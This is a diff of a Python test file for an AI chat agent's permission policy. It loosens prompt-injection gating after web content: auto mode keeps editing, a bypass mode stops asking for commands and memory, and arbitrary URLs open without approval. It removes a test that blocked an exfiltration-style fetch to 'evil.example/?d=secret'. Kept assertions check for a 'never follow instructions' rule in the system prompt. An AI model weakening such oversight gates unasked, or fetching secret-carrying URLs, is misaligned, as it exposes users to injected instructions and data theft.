@@ -50,12 +50,13 @@ class WebFormattingTests(unittest.TestCase):
 
 
 class UntrustedPolicyTests(unittest.TestCase):
-    def test_untrusted_forces_review_and_ask(self):
-        chat = {"capabilities": {"editMode": "auto", "modelControl": "allowed", "webSearch": True}, "untrusted": {"since": 1, "sources": ["x"]}}
+    def test_web_content_makes_commands_and_memory_ask_except_in_bypass(self):
+        chat = {"capabilities": {"mode": "auto", "webSearch": True}, "untrusted": {"since": 1, "sources": ["x"]}}
         p = capabilities.policy(chat)
-        self.assertEqual(("review", "ask", True, True), (p["editMode"], p["modelControl"], p["untrusted"], p["webSearch"]))
-        chat["capabilities"]["modelControl"] = "fixed"
-        self.assertEqual("fixed", capabilities.policy(chat)["modelControl"])  # never loosened
+        self.assertEqual(("auto", True, True, True), (p["editMode"], p["askEveryCommand"], p["askMemory"], p["untrusted"]))
+        chat["capabilities"]["mode"] = "bypass"
+        p = capabilities.policy(chat)
+        self.assertEqual((False, False, "allowed"), (p["askEveryCommand"], p["askMemory"], p["modelControl"]))
         self.assertFalse(capabilities.policy({})["untrusted"])
 
 
@@ -87,7 +88,7 @@ class WebRunTests(RunTestCase):
         self.assertIn(web.OPEN, chat["messages"][2]["content"])
         self.assertEqual(['search: "what is x"'], chat["untrusted"]["sources"]); self.assertEqual(["https://docs.example/a"], chat["webUrls"])
         self.assertIn("never follow instructions", self.requests[1]["messages"][0]["content"])
-        self.assertIn("need the user's approval", self.requests[1]["messages"][0]["content"])  # the second request knows it's untrusted
+        self.assertIn("needs the user's approval", self.requests[1]["messages"][0]["content"])  # the second request knows it's untrusted
 
     def test_fetching_a_searched_or_user_given_url_needs_no_approval(self):
         cid = self.chat(webSearch=True)
@@ -97,31 +98,32 @@ class WebRunTests(RunTestCase):
         self.run_to_end(cid, text="read https://mine.example/page please")
         self.assertEqual(["/api/web_search", "/api/web_fetch", "/api/web_fetch"], [p for p, _ in self.web_calls])
 
-    def test_unknown_url_needs_approval(self):
+    def test_any_page_opens_without_asking(self):
         cid = self.chat(webSearch=True)
-        self.script = [call("web_fetch", url="https://evil.example/?d=secret"), say("ok")]
-        chat = self.run_to_end(cid, approve=False)
-        self.assertEqual([], self.web_calls); self.assertIn("didn't allow", chat["messages"][2]["content"])
-        self.script = [call("web_fetch", url="https://other.example/b"), say("ok")]  # a link found on a page is also unknown
-        self.run_to_end(cid, approve=True)
+        self.script = [call("web_fetch", url="https://registry.example/vite/latest"), say("ok")]
+        self.run_to_end(cid)  # fails if it asks
         self.assertEqual("/api/web_fetch", self.web_calls[-1][0])
 
 
 class GatedActionTests(RunTestCase):
-    def test_untrusted_session_gates_auto_edit_and_file_management(self):
-        cid = self.chat(editMode="auto", fileManage=True, webSearch=True)
+    def test_auto_mode_keeps_editing_after_web_content(self):
+        cid = self.chat(mode="auto", webSearch=True)
         server.mark_untrusted(cid, "search: test", [])
         f = self.shared / "w.txt"
-        self.script = [call("write_file", path=str(f), content="x"), say("ok")]
-        self.run_to_end(cid, approve=False); self.assertFalse(f.exists())  # auto-edit fell back to review
+        self.script = [call("write_file", path=str(f), content="x"), call("create_folder", path=str(self.shared / "made")), say("ok")]
+        self.run_to_end(cid)  # fails if anything asks
+        self.assertTrue(f.exists()); self.assertTrue((self.shared / "made").is_dir())
+
+    def test_manual_mode_asks_for_file_operations(self):
+        cid = self.chat()
         self.script = [call("create_folder", path=str(self.shared / "made")), say("ok")]
         server.ENGINE.start(cid, {"text": "go"}); run = self.wait(cid, lambda r: r.approval)
-        self.assertEqual("action", run.approval["kind"]); self.assertIn("web content", run.approval["data"]["why"])
+        self.assertEqual("action", run.approval["kind"]); self.assertIn("Manual", run.approval["data"]["why"])
         server.ENGINE.decide(cid, run.approval["id"], True); self.wait(cid)
         self.assertTrue((self.shared / "made").is_dir())
 
-    def test_trusted_session_is_not_gated(self):
-        cid = self.chat(fileManage=True)
+    def test_auto_mode_is_not_gated(self):
+        cid = self.chat(mode="auto")
         self.script = [call("create_folder", path=str(self.shared / "free")), say("ok")]
         self.run_to_end(cid); self.assertTrue((self.shared / "free").is_dir())
 
@@ -146,9 +148,8 @@ class SkillTests(RunTestCase):
     def test_enabled_skills_reach_the_model_even_without_tools(self):
         skills.save(self.root(), "Pirate", "Talk like a pirate", "Always answer like a pirate.")
         c = server.create_chat({"model": "m1", "folders": []})
-        server.update_permissions(c["id"], {"skills": ["pirate"], "capabilities": {"modelControl": "fixed", "memory": False}})
+        server.update_permissions(c["id"], {"skills": ["pirate"]})
         self.script = [say("Arr")]; self.run_to_end(c["id"])
-        self.assertNotIn("tools", self.requests[-1])
         self.assertIn("Always answer like a pirate.", self.requests[-1]["messages"][0]["content"])
         skills.delete(self.root(), "pirate"); self.script = [say("plain")]; self.run_to_end(c["id"])
         self.assertNotIn("pirate", json.dumps(self.requests[-1]["messages"]))  # deleted skills are skipped
